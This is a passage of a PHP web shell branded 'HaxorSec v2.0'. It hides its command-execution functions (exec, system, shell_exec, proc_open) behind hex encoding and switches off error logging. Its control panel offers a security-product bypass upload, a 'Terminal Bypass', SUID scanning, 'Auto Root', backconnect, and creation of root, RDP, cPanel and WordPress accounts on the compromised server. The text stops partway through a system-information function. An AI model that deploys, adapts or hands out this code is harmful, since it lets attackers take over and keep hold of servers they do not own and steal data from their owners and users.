<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
    '636f7079' # co py => 34
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if (!empty($_GET['don'])) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>HaxorSec [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=Roboto+Mono:wght@300;400;500;600;700&display=swap');
        
        :root {
            --primary: #0f172a;
            --secondary: #020617;
            --accent: #3b82f6;
            --accent-hover: #60a5fa;
            --text: #e2e8f0;
            --highlight: #93c5fd;
            --danger: #ef4444;
            --success: #10b981;
            --warning: #f59e0b;
        }
        
        body {
            font-family: 'Roboto Mono', monospace;
            background-color: var(--secondary);
            color: var(--text);
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        
        .cyber-font {
            font-family: 'Orbitron', sans-serif;
        }
        
        .glass-effect {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .cyber-border {
            border: 1px solid rgba(59, 130, 246, 0.3);
            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
        }
        
        .sidebar {
            width: 280px;
            transition: all 0.3s;
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.9) 0%, rgba(2, 6, 23, 0.9) 100%);
        }
        
        .main-content {
            margin-left: 280px;
            transition: all 0.3s;
        }
        
        .file-icon {
            transition: all 0.2s;
        }
        
        .file-icon:hover {
            transform: scale(1.1);
        }
        
        .nav-link {
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        
        .nav-link:hover {
            background: rgba(59, 130, 246, 0.1);
            border-left: 3px solid var(--accent);
        }
        
        .nav-link.active {
            background: rgba(59, 130, 246, 0.2);
            border-left: 3px solid var(--accent);
        }
        
        .badge {
            background: #830000;
            color: white;
            font-size: 0.7rem;
            padding: 2px 6px;
            border-radius: 4px;
        }
        
        .file-item:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .action-btn {
            transition: all 0.2s;
            opacity: 0;
        }
        
        .file-item:hover .action-btn {
            opacity: 1;
        }
        
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--secondary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 4px;
        }
        
        .CodeMirror {
            height: 70vh;
            font-family: 'Roboto Mono', monospace !important;
            font-size: 14px;
        }
        
        .terminal-output {
            font-family: 'Roboto Mono', monospace;
            background: #0f172a;
            color: #93c5fd;
        }
        
        .terminal-input {
            font-family: 'Roboto Mono', monospace;
            background: #0f172a;
            color: #93c5fd;
            caret-color: #93c5fd;
        }
        
        .path-breadcrumb {
            font-family: 'Roboto Mono', monospace;
        }
        
        .file-type-icon {
            width: 24px;
            height: 24px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
        }
  /* Database connection form */
  .db-form-input {
            background: rgba(15, 23, 42, 0.5);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: var(--text);
            padding: 0.75rem;
            border-radius: 0.25rem;
            margin-bottom: 1rem;
            width: 100%;
        }
        
        .db-form-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
        }
        
        .db-form-label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--accent);
            font-family: 'Orbitron', sans-serif;
        }
        
        .db-connect-btn {
            background: var(--accent);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.25rem;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Orbitron', sans-serif;
        }
        
        .db-connect-btn:hover {
            background: var(--accent-hover);
        }
        
        /* Database tables list */
        .db-tables-list {
            max-height: 300px;
            overflow-y: auto;
            margin-top: 1rem;
            border: 1px solid rgba(59, 130, 246, 0.3);
            border-radius: 0.25rem;
        }
        
        .db-table-item {
            padding: 0.75rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .db-table-item:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .db-table-item.active {
            background: rgba(59, 130, 246, 0.2);
            border-left: 3px solid var(--accent);
        }
        /* Cyberpunk glow effect */
        .cyber-glow {
            text-shadow: 0 0 5px rgba(59, 130, 246, 0.7);
        }
        
        .cyber-glow-danger {
            text-shadow: 0 0 5px rgba(239, 68, 68, 0.7);
        }
        
        .cyber-glow-success {
            text-shadow: 0 0 5px rgba(16, 185, 129, 0.7);
        }
        
        .cyber-glow-warning {
            text-shadow: 0 0 5px rgba(245, 158, 11, 0.7);
        }

        /* Progress bars */
        .progress-container {
            height: 6px;
            background: rgba(15, 23, 42, 0.5);
            border-radius: 3px;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            transition: width 0.3s ease;
        }
        
        .progress-cpu {
            background: linear-gradient(90deg, #3b82f6, #60a5fa);
        }
        
        .progress-mem {
            background: linear-gradient(90deg, #10b981, #34d399);
        }
        
        .progress-disk {
            background: linear-gradient(90deg, #f59e0b, #fbbf24);
        }

        /* System info cards */
        .info-card {
            background: linear-gradient(135deg, rgba(15, 23, 42, 0.7) 0%, rgba(2, 6, 23, 0.7) 100%);
            border: 1px solid rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }
        
        .info-card:hover {
            border-color: rgba(59, 130, 246, 0.5);
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.2);
        }

        /* Process table */
        .process-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.875rem;
        }
        
        .process-table th {
            background: rgba(15, 23, 42, 0.5);
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            font-family: 'Orbitron', sans-serif;
            color: var(--accent);
        }
        
        .process-table td {
            padding: 0.5rem 0.75rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .process-table tr:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .process-pid {
            color: var(--accent);
            font-weight: bold;
        }
        
        .process-user {
            color: var(--success);
        }
        
        .process-cpu {
            color: var(--warning);
        }
        
        .process-mem {
            color: var(--danger);
        }
        
        .process-command {
            font-family: 'Roboto Mono', monospace;
            max-width: 200px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        /* Network connections */
        .network-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.875rem;
        }
        
        .network-table th {
            background: rgba(15, 23, 42, 0.5);
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            font-family: 'Orbitron', sans-serif;
            color: var(--accent);
        }
        
        .network-table td {
            padding: 0.5rem 0.75rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .network-table tr:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .network-local {
            color: var(--accent);
        }
        
        .network-remote {
            color: var(--success);
        }
        
        .network-status {
            color: var(--warning);
        }
        
        .network-pid {
            color: var(--danger);
        }

        /* Database tables */
        .database-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.875rem;
        }
        
        .database-table th {
            background: rgba(15, 23, 42, 0.5);
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            font-family: 'Orbitron', sans-serif;
            color: var(--accent);
        }
        
        .database-table td {
            padding: 0.5rem 0.75rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .database-table tr:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .database-name {
            color: var(--accent);
        }
        
        .database-size {
            color: var(--success);
        }
        
        .database-rows {
            color: var(--warning);
        }

        /* Mobile styles */
        @media (max-width: 768px) {
            .sidebar {
                width: 100%;
                position: fixed;
                height: auto;
                bottom: 0;
                left: 0;
                z-index: 50;
                transform: translateY(calc(100% - 56px));
                transition: transform 0.3s ease;
            }
            
            .sidebar.active {
                transform: translateY(0);
            }
            
            .main-content {
                margin-left: 0;
                margin-bottom: 56px;
            }
            
            .sidebar-toggle {
                display: flex;
                position: fixed;
                top: 0; 
                left: 0;
                width: 100%;
                height: 42px;
                background: rgba(15, 23, 42, 0.9); 
                z-index: 60;
                justify-content: center;
                align-items: center;
                cursor: pointer;
                backdrop-filter: blur(8px); 
                box-shadow: 0 2px 8px rgba(0,0,0,0.3); 
            }
            
            .file-manager-grid {
                grid-template-columns: 1fr !important;
            }
            
            .file-item {
                grid-template-columns: repeat(12, 1fr) !important;
                gap: 0;
            }
            
            .file-info {
                display: flex;
                align-items: center;
            }
            
            .file-actions {
                display: flex;
                justify-content: flex-end;
                gap: 8px;
            }
            
            .modal {
                padding: 0 16px;
            }
            
            .modal-content {
                width: 100% !important;
                max-width: 100% !important;
            }
            
            .path-breadcrumb {
                overflow-x: auto;
                white-space: nowrap;
                padding: 8px 0;
            }
            
            .server-info {
                grid-template-columns: 1fr 1fr !important;
                gap: 8px;
            }
            
            /* Process table mobile */
            .process-table th, 
            .process-table td {
                padding: 0.5rem;
                font-size: 0.75rem;
            }
            
            /* Network table mobile */
            .network-table th,
            .network-table td {
                padding: 0.5rem;
                font-size: 0.75rem;
            }
            
            /* Database table mobile */
            .database-table th,
            .database-table td {
                padding: 0.5rem;
                font-size: 0.75rem;
            }
        }
        
        /* Dark mode toggle */
        .dark-mode-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 100;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: var(--accent);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: all 0.3s;
        }
        
        .dark-mode-toggle:hover {
            transform: scale(1.1);
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
        }
        
        /* Cyberpunk terminal effect */
        .cyber-terminal {
            position: relative;
        }
        
        .cyber-terminal::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, rgba(59, 130, 246, 0), rgba(59, 130, 246, 0.8), rgba(59, 130, 246, 0));
            animation: scanline 2s linear infinite;
        }
        
        @keyframes scanline {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100vh); }
        }
        
        /* Cyberpunk buttons */
        .cyber-btn {
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            border: 1px solid var(--accent);
        }
        
        .cyber-btn::before {
            content: "";
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.4), transparent);
            transition: all 0.5s;
        }
        
        .cyber-btn:hover::before {
            left: 100%;
        }
        
        .cyber-btn-danger {
            border-color: var(--danger);
        }
        
        .cyber-btn-danger::before {
            background: linear-gradient(90deg, transparent, rgba(239, 68, 68, 0.4), transparent);
        }
        
        .cyber-btn-success {
            border-color: var(--success);
        }
        
        .cyber-btn-success::before {
            background: linear-gradient(90deg, transparent, rgba(16, 185, 129, 0.4), transparent);
        }
        
        /* System stats grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
        }
        
        /* Cyberpunk panel */
        .cyber-panel {
            position: relative;
            border: 1px solid rgba(59, 130, 246, 0.3);
            background: rgba(15, 23, 42, 0.5);
        }
        
        .cyber-panel::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.8), transparent);
        }
        
        .cyber-panel::after {
            content: "";
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.8), transparent);
        }

        /* Disabled functions table */
        .disabled-functions-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 1rem;
        }
        
        .disabled-functions-table th {
            background: rgba(15, 23, 42, 0.5);
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            font-family: 'Orbitron', sans-serif;
            color: var(--accent);
        }
        
        .disabled-functions-table td {
            padding: 0.75rem;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }
        
        .disabled-functions-table tr:hover {
            background: rgba(59, 130, 246, 0.1);
        }
        
        .danger-badge {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
            padding: 0.25rem 0.5rem;
            border-radius: 0.25rem;
            font-size: 0.75rem;
            font-weight: bold;
        }
        
        .success-badge {
            background: rgba(16, 185, 129, 0.2);
            color: var(--success);
            padding: 0.25rem 0.5rem;
            border-radius: 0.25rem;
            font-size: 0.75rem;
            font-weight: bold;
        }
        
        /* Tab navigation */
        .tab-nav {
            display: flex;
            border-bottom: 1px solid rgba(59, 130, 246, 0.3);
            margin-bottom: 1rem;
        }
        
        .tab-link {
            padding: 0.75rem 1.5rem;
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
            font-family: 'Orbitron', sans-serif;
        }
        
        .tab-link:hover {
            color: var(--accent);
            border-bottom-color: rgba(59, 130, 246, 0.5);
        }
        
        .tab-link.active {
            color: var(--accent);
            border-bottom-color: var(--accent);
        }
        
        /* Kill process button */
        .kill-process-btn {
            background: rgba(239, 68, 68, 0.2);
            color: var(--danger);
            border: 1px solid var(--danger);
            padding: 0.25rem 0.5rem;
            border-radius: 0.25rem;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .kill-process-btn:hover {
            background: rgba(239, 68, 68, 0.4);
        }
        
        /* Database query box */
        .query-box {
            width: 100%;
            background: rgba(15, 23, 42, 0.5);
            border: 1px solid rgba(59, 130, 246, 0.3);
            color: var(--text);
            padding: 0.75rem;
            font-family: 'Roboto Mono', monospace;
            border-radius: 0.25rem;
            margin-bottom: 1rem;
            min-height: 100px;
        }
        
        /* Database results */
        .query-results {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 1rem;
        }
    </style>
</head>
<body class="cyber-terminal">
    <div class="sidebar-toggle md:hidden flex items-center justify-center">
        <i class="fas fa-bars text-white text-xl"></i>
        <span class="ml-2 text-white cyber-font">MENU</span>
    </div>
    
    <div class="flex h-screen overflow-hidden">
        <div class="sidebar glass-effect h-full fixed left-0 top-0 overflow-y-auto cyber-border">
            <div class="p-4">
                <div class="flex items-center justify-between mb-6 md:flex hidden">
                    <div class="flex items-center">
                        <i class="fas fa-robot text-blue-400 text-2xl mr-2 cyber-glow"></i>
                        <h1 class="text-xl font-bold cyber-font">HAXORSEC<span class="text-blue-400 cyber-glow">v2.0</span></h1>
                    </div>
                    <button class="close-sidebar md:hidden text-gray-400 hover:text-white">
                        <i class="fas fa-times"></i>
                    </button>
                </div>

                <div class="mb-6">
                    
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">QUICK ACTIONS</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                <i class="fas fa-home mr-1"></i> Home
                        </a>
                        <br>
                    <div class="flex items-center flex-wrap gap-2">
                        <a href="" id="create_folder" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                            <i class="fas fa-folder-plus mr-1"></i> Folder
                        </a>
                        <a href="" id="create_file" class="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
                            <i class="fas fa-file-circle-plus mr-1"></i> File
                        </a>
                    </div>
                    <br>
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">NORMAL UPLOAD</h3>
                    <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>' class="mb-6">
                        <div class="flex items-center flex-wrap gap-2">
                            <input type="file" name="haxorsec-upload" class="hidden" id="file-upload">
                            <label for="file-upload" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                <i class="fas fa-upload mr-2"></i> Upload
                            </label>
                            <button type="submit" name="haxorsec-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
                                <i class="fas fa-check mr-2"></i> Submit
                            </button>
                        </div>
                    </form>
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">BITNINJA BYPASS</h3>
                    <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>' class="mb-6">
                        <div class="flex items-center flex-wrap gap-2">
                            <input type="file" name="bitninja-upload" class="hidden" id="file-uploads">
                            <label for="file-uploads" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn">
                                <i class="fas fa-upload mr-2"></i> Upload
                            </label>
                            <button type="submit" name="bitninja-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center cyber-btn cyber-btn-success">
                                <i class="fas fa-check mr-2"></i> Submit
                            </button>
                        </div>
                    </form>
                </div>
                
                <div class="mb-4">
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">CYBER TOOLS</h3>
                    <ul>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-terminal text-green-400 mr-3 cyber-glow-success"></i>
                                <span>Terminal</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=chankro" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-terminal text-green-400 mr-3 cyber-glow-success"></i>
                                <span>Terminal Bypass</span>
                                <span class="badge ml-auto text-green-400 cyber-font">TOP</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&scan=suid" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-search text-cyan-400 mr-3 cyber-glow"></i>
                                <span>Scanner SUID</span>
                                <span class="badge ml-auto text-green-400 cyber-font">TOP</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-shield text-red-400 mr-3 cyber-glow-danger"></i>
                                <span>Auto Root</span>
                                <span class="badge ml-auto cyber-font">ROOT</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&malwarescan" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-shield-alt text-red-400 mr-3"></i>
                                <span>Malware Scanner</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&disabled_functions" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-ban text-red-400 mr-3 cyber-glow-danger"></i>
                                <span>Check Disabled Functions</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&dbmanager" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-database text-blue-400 mr-3 cyber-glow"></i>
                                <span>Database Manager</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&process" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-microchip text-blue-400 mr-3 cyber-glow"></i>
                                <span>Process Manager</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&network" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-network-wired text-green-400 mr-3 cyber-glow-success"></i>
                                <span>Network Connections</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-database text-blue-400 mr-3 cyber-glow"></i>
                                <span>Adminer</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-ghost text-purple-400 mr-3 cyber-glow"></i>
                                <span>Backdoor Destroyer</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-linux text-yellow-400 mr-3 cyber-glow-warning"></i>
                                <span>Lock Shell</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="lock-file" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-lock text-red-400 mr-3 cyber-glow-danger"></i>
                                <span>Lock File</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="root-user" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-plus text-green-400 mr-3 cyber-glow-success"></i>
                                <span>Create User</span>
                                <span class="badge ml-auto cyber-font">ROOT</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="create-rdp" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-laptop-code text-blue-400 mr-3 cyber-glow"></i>
                                <span>Create RDP</span>
                            </a>
                        </li>
                        <li>
                            <a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-flask text-orange-400 mr-3 cyber-glow-warning"></i>
                                <span>Linux Exploit</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-envelope text-pink-400 mr-3 cyber-glow"></i>
                                <span>PHP Mailer</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-secret text-purple-400 mr-3 cyber-glow"></i>
                                <span>Backconnect</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-unlock text-green-400 mr-3 cyber-glow-success"></i>
                                <span>Unlock Shell</span>
                            </a>
                        </li>
                        <li>
                            <a href="//hashes.com/en/tools/hash_identifier" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-code text-cyan-400 mr-3 cyber-glow"></i>
                                <span>Hash Identifier</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-cpanel text-orange-400 mr-3 cyber-glow-warning"></i>
                                <span>CPanel Reset</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-wordpress text-blue-400 mr-3 cyber-glow"></i>
                                <span>Create WP User</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <center><img src='https://cdn.privdayz.com/images/logo.jpg' height='15' width='75' referrerpolicy='unsafe-url' /></center>
        </div>
        <?php
        $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
        $get_cwd = $fungsi[0]();
        
        function getSystemInfo() {
            $info = array();
            if (function_exists('sys_getloadavg')) {
                $load = sys_getloadavg();
                $info['cpu_load'] = $load[0]; 
            } else {
                $info['cpu_load'] = 'N/A';
            }
            
            if (file_exists('/proc/meminfo')) {
                $memInfo = file('/proc/meminfo');
                $totalMemory = $freeMemory = 0;
                foreach ($memInfo as $line) {
                    if (strpos($line, 'MemTotal') === 0) {
                        $totalMemory = (int) filter_var($line, FILTER_SANITIZE_NUMBER_INT); 
                    }
                    if (strpos($line, 'MemFree') === 0) {
                        $freeMemory = (int) filter_var($line, FILTER_SANITIZE_NUMBER_INT); 
                    }
                }
                $info['mem_total'] = $totalMemory * 1024; 
                $info['mem_free'] = $freeMemory * 1024; 
                $info['mem_usage'] = $info['mem_total'] - $info['mem_free']; 
            } else {
